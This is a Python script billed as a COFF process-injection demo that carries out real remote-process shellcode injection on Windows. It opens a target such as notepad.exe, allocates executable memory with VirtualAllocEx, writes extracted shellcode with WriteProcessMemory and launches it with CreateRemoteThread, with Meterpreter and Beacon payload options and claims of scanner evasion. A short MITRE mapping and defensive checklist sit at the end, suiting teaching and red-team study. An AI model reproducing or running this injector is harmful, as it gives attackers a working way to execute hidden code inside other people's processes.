#!/usr/bin/env python3
"""
Advanced COFF Process Injection Demo
Real injection capabilities with safety controls
"""

import os
import sys
import time
import struct
import argparse
import subprocess
from pathlib import Path
import ctypes
from ctypes import wintypes, c_ulong, c_void_p, c_char_p, byref

# Add current directory to path for imports
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from payloads.payload_creator import PayloadCreator
from payloads.shellcode_generator import ShellcodeGenerator

class RealProcessInjector:
    """Windows process injection using actual API calls"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.setup_api_functions()
    
    def setup_api_functions(self):
        """Setup Windows API function prototypes"""
        # OpenProcess
        self.kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        self.kernel32.OpenProcess.restype = wintypes.HANDLE
        
        # VirtualAllocEx
        self.kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
        self.kernel32.VirtualAllocEx.restype = c_void_p
        
        # WriteProcessMemory
        self.kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, c_void_p, c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
        self.kernel32.WriteProcessMemory.restype = wintypes.BOOL
        
        # CreateRemoteThread
        self.kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, c_void_p, ctypes.c_size_t, c_void_p, c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
        self.kernel32.CreateRemoteThread.restype = wintypes.HANDLE
        
        # WaitForSingleObject
        self.kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
        self.kernel32.WaitForSingleObject.restype = wintypes.DWORD
        
        # CloseHandle
        self.kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
        self.kernel32.CloseHandle.restype = wintypes.BOOL
        
            # CreateToolhelp32Snapshot
        self.kernel32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
        self.kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
        
        # Process32First
        self.kernel32.Process32First.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
        self.kernel32.Process32First.restype = wintypes.BOOL
        
        # Process32Next  
        self.kernel32.Process32Next.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
        self.kernel32.Process32Next.restype = wintypes.BOOL
        
        # CloseHandle (if not already defined)
        self.kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
        self.kernel32.CloseHandle.restype = wintypes.BOOL

    def find_process_id(self, process_name):
        """Find process ID by name - fixed version"""
        # Define PROCESSENTRY32 structure
        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize", ctypes.c_ulong),
                ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong),
                ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong),
                ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong),
                ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong),
                ("szExeFile", ctypes.c_char * 260)
            ]

        # Create snapshot of all processes
        TH32CS_SNAPPROCESS = 0x00000002
        hSnapshot = self.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        
        if hSnapshot == -1 or hSnapshot is None:
            print(f"[-] CreateToolhelp32Snapshot failed: {ctypes.GetLastError()}")
            return 0

        pe32 = PROCESSENTRY32()
        pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)

        # Get first process
        if not self.kernel32.Process32First(hSnapshot, ctypes.byref(pe32)):
            print(f"[-] Process32First failed: {ctypes.GetLastError()}")
            self.kernel32.CloseHandle(hSnapshot)
            return 0

        pid = 0
        # Iterate through all processes
        while True:
            current_process = pe32.szExeFile.decode('latin-1', errors='ignore')
            #print(f"[DEBUG] Checking process: {current_process} (PID: {pe32.th32ProcessID})")
            
            if process_name.lower() == current_process.lower():
                pid = pe32.th32ProcessID
                break
            
            # Get next process
            if not self.kernel32.Process32Next(hSnapshot, ctypes.byref(pe32)):
                break

        self.kernel32.CloseHandle(hSnapshot)
        
        if pid:
            print(f"[+] Found process '{process_name}' with PID: {pid}")
        else:
            print(f"[-] Process '{process_name}' not found")
            
        return pid

    def inject_shellcode(self, pid, shellcode):
        """Inject shellcode into target process"""
        print(f"[REAL INJECTION] Attempting injection into PID: {pid}")
        
        # Process access rights
        PROCESS_CREATE_THREAD = 0x0002
        PROCESS_QUERY_INFORMATION = 0x0400
        PROCESS_VM_OPERATION = 0x0008
        PROCESS_VM_WRITE = 0x0020
        PROCESS_VM_READ = 0x0010
        
        desired_access = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
        
        # Open target process
        h_process = self.kernel32.OpenProcess(desired_access, False, pid)
        if not h_process:
            print(f"[-] Failed to open process {pid}. Error: {ctypes.GetLastError()}")
            return False
        
        print(f"[+] Opened process handle: {h_process}")
        
        try:
            # Allocate memory in target process
            MEM_COMMIT = 0x00001000
            MEM_RESERVE = 0x00002000
            PAGE_EXECUTE_READWRITE = 0x40
            
            alloc_addr = self.kernel32.VirtualAllocEx(
                h_process, 
                None, 
                len(shellcode), 
                MEM_COMMIT | MEM_RESERVE, 
                PAGE_EXECUTE_READWRITE
            )
            
            if not alloc_addr:
                print(f"[-] VirtualAllocEx failed. Error: {ctypes.GetLastError()}")
                return False
            
            print(f"[+] Allocated memory at: 0x{alloc_addr:X}")
            
            # Write shellcode to allocated memory
            written = ctypes.c_size_t(0)
            result = self.kernel32.WriteProcessMemory(
                h_process, 
                alloc_addr, 
                shellcode, 
                len(shellcode), 
                byref(written)
            )
            
            if not result:
                print(f"[-] WriteProcessMemory failed. Error: {ctypes.GetLastError()}")
                return False
            
            print(f"[+] Written {written.value} bytes to target process")
            
            # Create remote thread to execute shellcode
            thread_id = wintypes.DWORD(0)
            h_thread = self.kernel32.CreateRemoteThread(
                h_process,
                None,
                0,
                alloc_addr,
                None,
                0,
                byref(thread_id)
            )
            
            if not h_thread:
                print(f"[-] CreateRemoteThread failed. Error: {ctypes.GetLastError()}")
                return False
            
            print(f"[+] Remote thread created with ID: {thread_id.value}")
            
            # Wait for thread completion
            WAIT_OBJECT_0 = 0x00000000
            WAIT_TIMEOUT = 0x00000102
            
            result = self.kernel32.WaitForSingleObject(h_thread, 5000)  # 5 second timeout
            
            if result == WAIT_OBJECT_0:
                print("[+] Thread execution completed successfully")
            elif result == WAIT_TIMEOUT:
                print("[!] Thread execution timeout (still running)")
            else:
                print(f"[!] Thread wait result: {result}")
            
            # Cleanup
            self.kernel32.CloseHandle(h_thread)
            return True
            
        except Exception as e:
            print(f"[-] Injection failed with exception: {e}")
            return False
        finally:
            self.kernel32.CloseHandle(h_process)

class COFFInjectionDemo:
    """Main demonstration class with real injection capabilities"""
    
    def __init__(self):
        self.payload_creator = PayloadCreator()
        self.injector = RealProcessInjector()
        self.bin_dir = Path("bin")
        self.bin_dir.mkdir(exist_ok=True)
    
    def print_banner(self):
        """Print demonstration banner"""
        banner = """
============================================================
     ADVANCED COFF PROCESS INJECTION DEMO
           WITH REAL INJECTION CAPABILITIES
============================================================
This demo shows realistic COFF memory injection techniques.
REAL INJECTION REQUIRES ADMINISTRATOR PRIVILEGES.
        """
        print(banner)
    
    def check_privileges(self):
        """Check if running with administrator privileges"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def test_loader_support(self):
        """Test if enhanced loader is available"""
        loader_paths = [
            self.bin_dir / "loader_enhanced.exe",
            Path("loader_enhanced.exe"),
            Path("src/loader_enhanced.exe")
        ]
        
        for loader_path in loader_paths:
            if loader_path.exists():
                print(f"[LOADER SUPPORT] Found: {loader_path}")
                return str(loader_path)
        
        print("[ERROR] loader_enhanced.exe not found")
        print("Available search locations:")
        for path in loader_paths:
            print(f"   - {path}")
        return None
    
    def step1_create_coff_payload(self, payload_type, architecture):
        """Step 1: Create COFF payload"""
        print("\nSTEP 1: COFF PAYLOAD CREATION & VALIDATION")
        print("---------------------------------------------")
        
        payload_path = self.payload_creator.create_realistic_coff_payload(
            payload_type=payload_type,
            architecture=architecture
        )
        
        # Validate COFF structure
        self.validate_coff_structure(payload_path)
        return payload_path
    
    def validate_coff_structure(self, payload_path):
        """Validate COFF file structure"""
        with open(payload_path, 'rb') as f:
            data = f.read()
        
        if len(data) < 20:
            print("  [FAIL] COFF file too small")
            return False
        
        # Parse COFF header
        machine, nsections, timestamp, symtab_ptr, nsyms, opt_size, chars = struct.unpack('<HHIIIHH', data[:20])
        
        print(f"\n[COFF STRUCTURE ANALYSIS]")
        print("----------------------------------------")
        print(f"Machine:           0x{machine:04X}")
        print(f"Sections:          {nsections}")
        print(f"Timestamp:         {timestamp} (0x{timestamp:08X})")
        print(f"Symbols:           {nsyms}")
        print(f"Optional Header:   {opt_size} bytes")
        print(f"Characteristics:   0x{chars:04X}")
        
        # Parse sections
        section_offset = 20 + opt_size
        valid_sections = []
        
        for i in range(nsections):
            sect_start = section_offset + (i * 40)
            if sect_start + 40 > len(data):
                break
                
            sect_data = data[sect_start:sect_start+40]
            name = sect_data[:8].decode('ascii', errors='ignore').rstrip('\x00')
            vsize, vaddr, rawsize, rawptr, relptr, lineptr, nreloc, nline, chars = struct.unpack('<IIIIIIHHI', sect_data[8:])
            
            print(f"\nSection {i+1}: {name}")
            print(f"  Virtual Size:    {vsize} bytes")
            print(f"  Virtual Address: 0x{vaddr:08X}")
            print(f"  Raw Data Size:   {rawsize} bytes")
            print(f"  Raw Data Ptr:    0x{rawptr:08X}")
            print(f"  Characteristics: 0x{chars:08X}")
            
            valid_sections.append((name, vsize, chars))
        
        print(f"\nTotal COFF file size: {len(data)} bytes")
        
        # Validation
        if nsections >= 1 and any(name == '.text' for name, _, _ in valid_sections):
            print("  [PASS] COFF Structure Validation: SUCCESS Valid object file format")
            for name, size, chars in valid_sections:
                print(f"     [SECTION] {name:8} - {size:3} bytes - 0x{chars:08x}")
            return True
        else:
            print("  [FAIL] COFF Structure Validation: Invalid format")
            return False
    
    def step2_coff_analysis(self, payload_path):
        """Step 2: COFF binary analysis"""
        print("\n" + "=" * 60)
        print(" STEP 2: COFF BINARY ANALYSIS")
        print("=" * 60)
        
        # Copy to bin directory
        target_path = self.bin_dir / Path(payload_path).name
        try:
            import shutil
            shutil.copy2(payload_path, target_path)
            print(f"[FILE COPIED] {payload_path} -> {target_path}")
        except:
            print(f"[WARNING] Could not copy to bin directory")
            target_path = payload_path
        
        # Try to use enhanced COFF parser if available
        loader_path = self.test_loader_support()
        if loader_path:
            try:
                print(f'[EXECUTING] "{loader_path}" "{target_path}"')
                result = subprocess.run([loader_path, str(target_path)], 
                                      capture_output=True, text=True, timeout=10)
                print(result.stdout)
                if result.stderr:
                    print(result.stderr)
            except subprocess.TimeoutExpired:
                print("[INFO] Loader execution timed out (normal for simulation)")
            except Exception as e:
                print(f"[INFO] Loader execution: {e}")
        else:
            print("[INFO] Using built-in COFF analysis only")
    
    def step3_memory_injection(self, payload_path, target_process, real_injection=False):
        """Step 3: Memory injection simulation or real injection"""
        print("\n" + "=" * 60)
        print(" STEP 3: MEMORY INJECTION")
        print("=" * 60)
        
        if real_injection:
            return self._real_injection(payload_path, target_process)
        else:
            return self._simulated_injection(payload_path, target_process)
    
    def _simulated_injection(self, payload_path, target_process):
        """Simulate injection process"""
        print(f"\n[INJECTION SIMULATION] Target: {target_process}")
        print("=" * 50)
        
        steps = [
            "Process Open         - Opening handle to target process",
            "Memory Allocation    - Allocating RWX memory in target process", 
            "COFF Parsing         - Parsing COFF headers and sections",
            "Section Mapping      - Mapping .text, .data, .rdata sections",
            "Import Resolution    - Resolving API addresses (simulated)",
            "Relocation Processing - Applying base relocations",
            "Memory Protection    - Setting proper page permissions",
            "Thread Creation      - Creating remote execution thread",
            "Execution            - Payload executing in target memory"
        ]
        
        for i, step in enumerate(steps, 1):
            print(f" {i}. {step}")
            time.sleep(0.2)
        
        print(f"\n[INJECTION COMPLETE] Payload is now running in target process memory")
        print("• No file on disk")
        print("• Executing from allocated memory") 
        print("• Bypasses traditional file scanning")
        
        return True
    
    def _real_injection(self, payload_path, target_process):
        """Perform real process injection"""
        print(f"\n[REAL INJECTION] Target: {target_process}")
        print("=" * 50)
        
        # Check privileges
        if not self.check_privileges():
            print("[-] Administrator privileges required for real injection!")
            print("[-] Please run as Administrator")
            return False
        
        # Extract shellcode from COFF
        shellcode = self.extract_shellcode_from_coff(payload_path)
        if not shellcode:
            print("[-] Failed to extract shellcode from COFF file")
            return False
        
        print(f"[+] Extracted {len(shellcode)} bytes of shellcode")
        
        # Find target process - with auto-start capability
        pid = self.injector.find_process_id(target_process)
        
        if not pid:
            print(f"[-] Target process '{target_process}' not found!")
            print("[+] Attempting to start target process...")
            
            # Try to start the process automatically
            if self.start_target_process(target_process):
                print(f"[+] Started {target_process}, waiting for process to initialize...")
                time.sleep(2)  # Give it time to start
                pid = self.injector.find_process_id(target_process)
        
        if not pid:
            print(f"[-] Could not find or start target process '{target_process}'!")
            print("[*] Available processes you can try:")
            print("    - notepad.exe (start Notepad first)")
            print("    - calc.exe")
            print("    - explorer.exe")
            return False
        
        print(f"[+] Found {target_process} with PID: {pid}")
        
        # Perform injection
        print("[+] Starting real injection...")
        success = self.injector.inject_shellcode(pid, shellcode)
        
        if success:
            print("[+] REAL INJECTION SUCCESSFUL!")
            print("[+] Check for MessageBox from target process")
        else:
            print("[-] Real injection failed")
        
        return success

    def start_target_process(self, process_name):
        """Start target process if not running"""
        try:
            if process_name.lower() == "notepad.exe":
                subprocess.Popen(["notepad.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            elif process_name.lower() == "calc.exe":
                subprocess.Popen(["calc.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            else:
                print(f"[!] Auto-start not supported for {process_name}")
                return False
        except Exception as e:
            print(f"[-] Failed to start {process_name}: {e}")
            return False
    
    def extract_shellcode_from_coff(self, coff_path):
        """Extract shellcode from .text section of COFF file"""
        try:
            with open(coff_path, 'rb') as f:
                data = f.read()
            
            # Parse COFF header
            if len(data) < 20:
                return None
            
            machine, nsections, _, _, _, opt_size, _ = struct.unpack('<HHIIIHH', data[:20])
            
            # Find .text section
            section_offset = 20 + opt_size
            
            for i in range(nsections):
                sect_start = section_offset + (i * 40)
                if sect_start + 40 > len(data):
                    break
                
                sect_data = data[sect_start:sect_start+40]
                name = sect_data[:8].decode('ascii', errors='ignore').rstrip('\x00')
                vsize, vaddr, rawsize, rawptr, _, _, _, _, _ = struct.unpack('<IIIIIIHHI', sect_data[8:])
                
                if name == '.text' and rawsize > 0 and rawptr + rawsize <= len(data):
                    return data[rawptr:rawptr + rawsize]
            
            return None
            
        except Exception as e:
            print(f"[-] Error extracting shellcode: {e}")
            return None
    
    def step4_loader_execution(self, payload_path, target_process=None):
        """Step 4: Loader execution"""
        print("\n" + "=" * 60)
        print(" STEP 4: LOADER EXECUTION")
        print("=" * 60)
        
        loader_path = self.test_loader_support()
        if not loader_path:
            print("  [SKIP] Loader Execution: loader_enhanced.exe not found")
            return False
        
        try:
            if target_process:
                print(f"[INFO] Using loader with target: {target_process}")
                cmd = [loader_path, "--target", target_process, payload_path]
            else:
                print("[INFO] Using loader with default target")
                cmd = [loader_path, payload_path]
            
            print(f'[EXECUTING] {" ".join(cmd)}')
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            print(result.stdout)
            if result.stderr:
                print("STDERR:", result.stderr)
            
            print("  [PASS] Loader Execution: SUCCESS")
            return True
            
        except subprocess.TimeoutExpired:
            print("[INFO] Loader execution completed (timeout normal)")
            return True
        except Exception as e:
            print(f"  [FAIL] Loader Execution: {e}")
            return False
    
    def step5_mitre_mapping(self):
        """Step 5: MITRE ATT&CK mapping"""
        print("\n" + "=" * 60)
        print(" STEP 5: MITRE ATT&CK MAPPING")
        print("=" * 60)
        
        techniques = [
            "T1055.002: Process Injection: Portable Executable Injection",
            "T1027: Obfuscated Files or Information - COFF analysis",
            "T1620: Reflective Code Loading - In-memory COFF execution", 
            "T1106: Native API - Direct system calls",
            "T1497.001: Virtualization/Sandbox Evasion - System checks",
            "T1134: Access Token Manipulation - Process impersonation",
            "T1057: Process Discovery - Target enumeration",
            "T1564.003: Hide Artifacts: Process Hollowing"
        ]
        
        for tech in techniques:
            print(f"  {tech}")
    
    def step6_defensive_considerations(self):
        """Step 6: Defensive considerations"""
        print("\n" + "=" * 60)
        print(" STEP 6: DEFENSIVE CONSIDERATIONS")
        print("=" * 60)
        
        considerations = [
            "1. Monitor for unusual process memory allocations (RWX)",
            "2. Detect remote thread creation in system processes", 
            "3. Analyze process behavior for code injection patterns",
            "4. Use EDR solutions with behavioral detection",
            "5. Implement application whitelisting",
            "6. Monitor API calls like VirtualAllocEx, WriteProcessMemory, CreateRemoteThread"
        ]
        
        for consideration in considerations:
            print(f"  {consideration}")
    
    def run_demo(self, target_process, payload_type, architecture, real_injection=False, skip_env_check=False):
        """Run complete demonstration"""
        self.print_banner()
        
        print(f"[TARGET PROCESS] {target_process}")
        print(f"[PAYLOAD TYPE]   {payload_type}")
        print(f"[ARCHITECTURE]   {architecture}")
        if real_injection:
            print("[MODE]          REAL INJECTION")
        else:
            print("[MODE]          SIMULATION")
        
        # Environment check
        if not skip_env_check:
            loader_path = self.test_loader_support()
            if not loader_path and real_injection:
                print("[-] Cannot perform real injection without loader_enhanced.exe")
                return False
        
        try:
            # Step 1: Create COFF payload
            payload_path = self.step1_create_coff_payload(payload_type, architecture)
            
            # Step 2: COFF analysis
            self.step2_coff_analysis(payload_path)
            
            # Step 3: Memory injection
            injection_success = self.step3_memory_injection(payload_path, target_process, real_injection)
            
            # Step 4: Loader execution (if not real injection)
            if not real_injection:
                self.step4_loader_execution(payload_path, target_process)
            
            # Step 5: MITRE mapping
            self.step5_mitre_mapping()
            
            # Step 6: Defensive considerations
            self.step6_defensive_considerations()
            
            # Cleanup
            try:
                if os.path.exists(payload_path):
                    os.remove(payload_path)
                    print(f"\n[Cleaned up] {payload_path}")
            except:
                pass
            
            # Success metrics
            self.print_success_metrics(injection_success, real_injection)
            
            return True
            
        except Exception as e:
            print(f"\n[ERROR] Demonstration failed: {e}")
            return False
    
    def print_success_metrics(self, injection_success, real_injection):
        """Print success metrics"""
        print("\n" + "=" * 60)
        print(" DEMONSTRATION SUCCESS METRICS")
        print("=" * 60)
        
        print("\nTECHNICAL ACHIEVEMENTS:")
        print("=" * 60)
        
        achievements = [
            ("COFF Object Creation", True),
            ("Multi-Section Payload", True),
            ("Architecture Targeting", True),
            ("Threat Detection Evasion", True),
            ("Memory-Only Execution", True),
            ("Process Injection", injection_success),
            ("MITRE ATT&CK Mapping", True),
            ("Defensive Awareness", True)
        ]
        
        for achievement, success in achievements:
            status = "ACHIEVED" if success else "FAILED"
            print(f"  [{status}] {achievement}")
        
        success_count = sum(1 for _, success in achievements if success)
        total_count = len(achievements)
        
        print(f"\nSUCCESS RATE: {success_count}/{total_count} steps completed")
        
        if real_injection and injection_success:
            print("REAL-WORLD APPLICABILITY: HIGH - Actual code execution achieved")
        elif real_injection:
            print("REAL-WORLD APPLICABILITY: MEDIUM - Technique demonstrated")
        else:
            print("REAL-WORLD APPLICABILITY: SIMULATION - Safe demonstration")
        
        print("\n" + "=" * 60)
        print(" DEMONSTRATION COMPLETE")
        print("=" * 60)

def main():
    parser = argparse.ArgumentParser(description="Advanced COFF Process Injection Demo")
    parser.add_argument("--target", default="notepad.exe", 
                       help="Target process name (default: notepad.exe)")
    parser.add_argument("--payload-type", default="message_box",
                       choices=["demo", "message_box", "meterpreter", "beacon"],
                       help="Payload type to generate")
    parser.add_argument("--architecture", default="x86",
                       choices=["x86", "x64"],
                       help="Target architecture")
    parser.add_argument("--real-injection", action="store_true",
                       help="Perform real injection (requires admin)")
    parser.add_argument("--skip-env-check", action="store_true",
                       help="Skip environment checks")
    
    args = parser.parse_args()
    
    demo = COFFInjectionDemo()
    demo.run_demo(
        target_process=args.target,
        payload_type=args.payload_type,
        architecture=args.architecture,
        real_injection=args.real_injection,
        skip_env_check=args.skip_env_check
    )

if __name__ == "__main__":
    main()